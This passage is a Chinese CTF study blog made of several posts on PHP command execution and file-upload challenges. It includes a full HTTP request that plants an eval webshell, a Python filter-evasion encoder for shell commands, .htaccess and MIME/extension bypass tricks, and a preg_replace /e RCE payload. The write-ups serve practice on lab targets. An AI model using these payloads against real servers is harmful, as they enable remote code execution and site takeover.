<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST /class11/3.php?cmd=?&gt;&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?&gt; HTTP/1.1</span><br><span class="line">Host: 192.168.102.128:18080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 187</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------123</span><br><span class="line">Content-Disposition:from-data:name=&quot;file&quot;;filename=&quot;1.txt&quot; </span><br><span class="line"></span><br><span class="line">echo &quot;&lt;?php eval(\$_POST[&#x27;shell&#x27;]);&quot; &gt; /www/admin/localhost_80/wwwroot/class11/success.php</span><br><span class="line">----------123--</span><br></pre></td></tr></table></figure>

<p>注意：请求从GET换成POST，cmd后面和HTTP只能一个空格，cmd中的?,&gt;,&lt;,+不能url编码</p>
<p>由于最后一位不一定是大写，多执行几次！！！</p>
<p>Content-Type:multipart&#x2F;form-data;boundary&#x3D;——–123必须加上,上下横线数量必须相同，后面必须只有两个–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">----------123</span><br><span class="line">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="line"></span><br><span class="line">#!/bin/sh</span><br><span class="line">ls /</span><br><span class="line">----------123--</span><br><span class="line">也可以直接执行系统命令！</span><br></pre></td></tr></table></figure>

<p>如果题目过滤了<code>@</code>，那么我们可以取<code>@</code>之前的一个字符，也就是<code>?</code>，即<code>%3f</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f/%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f%<span class="number">3</span>f[%<span class="number">3</span>f-[]`%<span class="number">3</span>b<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="；-过滤"><a href="#；-过滤" class="headerlink" title="；~ ^ &#96; &amp; | 过滤"></a>；~ ^ &#96; &amp; | 过滤</h4><p><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/18.png"></p>
<p>只能用自增运算，分号全部用短标签替换</p>
<h4 id="如果下划线也过滤了"><a href="#如果下划线也过滤了" class="headerlink" title="如果下划线也过滤了"></a>如果下划线也过滤了</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> cmdx <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="built_in">str</span> += <span class="string">f&#x27;\\\\$(($((1&lt;&lt;1))#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>((<span class="built_in">oct</span>(<span class="built_in">ord</span>(cmdx)))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span></span><br><span class="line">    ct = <span class="built_in">str</span>.replace(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;$&#123;##&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;$&#123;#&#125;&#x27;</span>)  <span class="comment">#将0,1替换为$&#123;#&#125;,$&#123;##&#125;</span></span><br><span class="line"></span><br><span class="line">    ct = <span class="string">&#x27;$&#123;!#&#125;&lt;&lt;&lt;$&#123;!#&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span> + ct + <span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line">    charset = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> ctx <span class="keyword">in</span> ct:</span><br><span class="line">        <span class="keyword">if</span> ctx.isprintable() <span class="keyword">and</span> ctx <span class="keyword">not</span> <span class="keyword">in</span> charset:</span><br><span class="line">            charset.add(ctx)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(enc(<span class="string">&quot;ls&quot;</span>))</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clyyhqmoy000s0ov58yoy1amg" data-title="php命令执行" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-4-14文件上传刷题日记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/4-14%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2024-04-14T07:20:42.000Z" itemprop="datePublished">2024-04-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/4-14%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">4.14文件上传刷题日记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="buuctf-是兄弟就来传马"><a href="#buuctf-是兄弟就来传马" class="headerlink" title="buuctf[是兄弟就来传马"></a>buuctf[是兄弟就来传马</h2><p>先传一个php木马</p>
<p><img src="/../images/0414-1.png"></p>
<p>页面报错，随便改一个后缀，看看是黑名单还是白名单过滤，这里php代码前加GIF89a绕过图片大小检查</p>
<p> <img src="/../images/0414-2.png"></p>
<p>报错，接着试一下是不是MIME过滤</p>
<p><code>Content-Type: image/png</code></p>
<p>上传成功 <code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
<p>接下来修改.htaccess解析文件,记得改Content-type</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;hack&quot;</span> &gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>&#x2F;var&#x2F;www&#x2F;html&#x2F;upload&#x2F;743be915f2c6ab5de3600d87068cafd2&#x2F;.htaccess succesfully uploaded!</p>
<p>接着上传hack.jpg图片<code>/var/www/html/upload/743be915f2c6ab5de3600d87068cafd2/hack.jpg succesfully uploaded!</code></p>
<p>拼接后的url蚁剑链接即可</p>
<h2 id="ACTF2020-Upload"><a href="#ACTF2020-Upload" class="headerlink" title="ACTF2020 Upload"></a>ACTF2020 Upload</h2><p>尝试上传php，发现前端拦截，上传png,用bp抓包改php，上传失败</p>
<p>尝试phtml，上传成功</p>
<p>Upload Success! Look here~ .&#x2F;uplo4d&#x2F;87d8f9288427fb50ed6e8dd6be21e62b.phtml</p>
<p><a target="_blank" rel="noopener" href="http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://b2a5f0cf-75b2-4af3-9386-e4d027a70dc1.node5.buuoj.cn:81/uplo4d/87d8f9288427fb50ed6e8dd6be21e62b.phtml蚁剑链接即可</a></p>
<p>ps:buu上面的文件上传题都有bug，经常导致重定向</p>
<h2 id="SWPUCTF-2021-新生赛-easyupload1-0"><a href="#SWPUCTF-2021-新生赛-easyupload1-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload1.0"></a>[SWPUCTF 2021 新生赛]easyupload1.0</h2><p>同样是png文件改phtml，用蚁剑链接只能找到fakeflag，看了wp才知道在phpinfo()中，长知识了</p>
<h2 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h2><p>提示用文件组合，.htaccess秒了(nss平台没bug)</p>
<h2 id="NISACTF-2022-babyupload复现"><a href="#NISACTF-2022-babyupload复现" class="headerlink" title="[NISACTF 2022]babyupload复现"></a>[NISACTF 2022]babyupload复现</h2><p>上传各种文件，发现一直返回badname，查看源代码，发现source目录，访问后给了Python源码</p>
<p>代码粘到gpt，发现文件不能带点，根据文件名给一个id，再通过<code>/file/uuid</code>访问文件，通过查询数据库得到对应文件名，在文件名前拼接<code>uploads/</code>后读取该路径下上传的文件。</p>
<p><code> with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f:        return f.read()</code></p>
<p>绝对路径拼接漏洞</p>
<blockquote>
<p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 &#x2F; 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径</p>
</blockquote>
<p>直接把文件名字改成&#x2F;flag，访问得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/4-14%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" data-id="clyyhqmom00010ov5ed8m5xjk" data-title="4.14文件上传刷题日记" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">刷题日记</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-XYCTF-刷题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/XYCTF-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2024-04-12T12:36:03.000Z" itemprop="datePublished">2024-04-12</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/XYCTF-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">[XYCTF]刷题笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h5 id="Solved-Warm-up"><a href="#Solved-Warm-up" class="headerlink" title="[Solved]Warm up"></a>[Solved]Warm up</h5><p>第一个是经典的0e绕过，?val1&#x3D;QNKCDZO&amp;val2&#x3D;240610708</p>
<p>$$md5 &#x3D;&#x3D; md5$$md5)用特殊字符串&amp;md5&#x3D;0e215962017</p>
<p>第三个利用$XYCTF可以被复写，保证xyctf和xy相同即可，md5编码XYCTF_550102591发现是0e打头，用0e绕过即可，&amp;XYCTF&#x3D;240610708&amp;XY&#x3D;240610708</p>
<p>接下来访问LLeeevvveeelll222.php</p>
<p>第一个if用到了interval，post,利用数组绕过a[]&#x3D;a</p>
<p><code>echo preg_replace($_GET[&#39;a&#39;],$_GET[&#39;b&#39;],$_GET[&#39;c&#39;]);</code>查阅资料得知a处正则用&#x2F;e方式读取可以执行命令，payload：<code>?a=/re/e&amp;b=print_r(scandir(&#39;.&#39;))&amp;c=re</code>读取到flag在根目录，&amp;b&#x3D;highlight_file(‘&#x2F;flag’)读取flag</p>
<h5 id="Solved-ezhttp"><a href="#Solved-ezhttp" class="headerlink" title="[Solved]ezhttp"></a>[Solved]ezhttp</h5><p>robots.txt-&gt;拿到账号密码</p>
<p>hackbar一路修改请求头即可</p>
<p>特殊之处在于X-Forward-F被过滤，用Client-ip</p>
<p>代理用Via</p>
<h5 id="ezmd5"><a href="#ezmd5" class="headerlink" title="ezmd5"></a>ezmd5</h5><p>传入两张同样的图片，返回{“areEqual”:false,”md5Equal”:true,”md5_1”:”af6794c93d1157c0688d6cc5600b8cae”,”md5_2”:”af6794c93d1157c0688d6cc5600b8cae”}</p>
<p>从网上查阅到两个MD5值相同但是图片不同的特例：</p>
<p><img src="/../images/plane.jpg"></p>
<p><img src="/../images/ship.jpg"></p>
<p>上传后得到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://dyinglight5.github.io/posts/XYCTF-%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="clyyhqmox000n0ov50ra920kt" data-title="[XYCTF]刷题笔记" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-upload-labs刷题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/posts/upload-labs%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
  <time class="dt-published" datetime="2024-04-04T12:28:21.000Z" itemprop="datePublished">2024-04-04</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/posts/upload-labs%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/">upload-labs刷题笔记</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="upload-labs刷题笔记"><a href="#upload-labs刷题笔记" class="headerlink" title="upload-labs刷题笔记"></a>upload-labs刷题笔记</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>源代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>是一个前端js验证代码，对上传文件的类型进行限制，把一句话脚本的名字改成hack.php.jpg,burp suite抓包把jpg去了即可，复制图片链接，蚁剑链接</p>
<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>php语言,是后端验证，同样是对上传的文件有图片格式的限制</p>
<p>image&#x2F;jpeg image&#x2F;png这种格式叫做MIME,上传时直接上传php脚本，bp抓包改content-type内容即可</p>
<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>函数解释：deny_ext :黑名单列表</strong></p>
<p><strong>trim(): :删除字符串两端的空格或其他预定义字符。用trim()函移除字符。我们没有添加移除的字符，就默认移除下列字符”\0” - NULL、”\t” - 制表符、”\n” - 换行、”\x0B” - 垂直制表符、”\r” - 回车、” “ - 空格（ltrm、rtrim）</strong></p>
<p><strong>deldot() :把文件后面的点删除windows的特性会自动对后缀名去”.” 处理比如: webshell.php. 。</strong></p>
<p><strong>strrchr() :查找字符串在另一个字符串中最后-次出现的位置,并返回从该位置到字符串结尾的所有字符(截取后缀)</strong></p>
<p><strong>str_ireplace():替换字符串中的一些字符（不区分大小写）。遵循的一些规则如果搜索的字符串是一个数组那么它会返回一个数组，且对数组中的每个元素进行查找和替换。（str_replace区分大小写）用str_ireplace(’::$DATA’, ‘’,fileext ) 函 数 防 止 在 后 缀 中 添 加 “ : : file_ext)函数防止在后缀中添加”::file</strong><br><strong>e</strong></p>
<p> <strong>xt)函数防止在后缀中添加”::DATA”绕过利用windows特性，可在后缀名中加” ::$DATA”绕过</strong></p>
<p><strong>strtolower(): 故名思意,转换为小写</strong></p>
<p><strong>strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。strrpos() 函数对大小写敏感。</strong></p>
<p><strong>stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</strong><br><strong>strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</strong><br><strong>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</strong><br><strong>getimagesize() :用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</strong></p>
<p>从源码中我们可以看出设定了黑名单，’.asp’,’.aspx’,’.php’,’.jsp’后缀的文件都不允许上传，并且会检查大小写、删除点和空格。</p>
<p>#后缀绕过常用手段<br>PHP:<br>php2、php3、php5、phtml、pht(是否解析需要根据配置文件中设置类型来决定)<br>ASP：<br>asa、cer、cdx<br>ASPX：<br>ascx、ashx、asac<br>JSP：<br>jsp、jspx、jspf</p>
<p><strong>有时候需要挨个进行尝试</strong></p>
<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>根据源代码得知，黑名单限制太多，换一种方式绕过，使用’.htaccess’文件绕过</p>
<p>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能</p>
<p>&#x2F;&#x2F;.htaccess  修改文件<br><code>SetHandler application/x-httpd-php</code></p>
<p>再上传一个图片格式的木马即可，自动解析为php</p>
<p>ps：phpstudy的apache有问题，复现不了</p>
<p>另一种方法是后缀名冗余(未知拓展名绕过)绕过，例如修改成<strong>one.php.aaa、one.php.xxxx</strong>等。然后直接使用中国菜刀连接。5,6也是这种方法绕过</p>
<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>加.(空格)<code>a.php. </code></p>
<h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>加.<code>a.php.</code></p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>增加后缀::$DATA</p>
<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>冗余后缀名</p>
<h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p><code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code>替换了后缀名</p>
<p>pphphp(php) phphpp(hpp)复写尝试</p>
<h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span 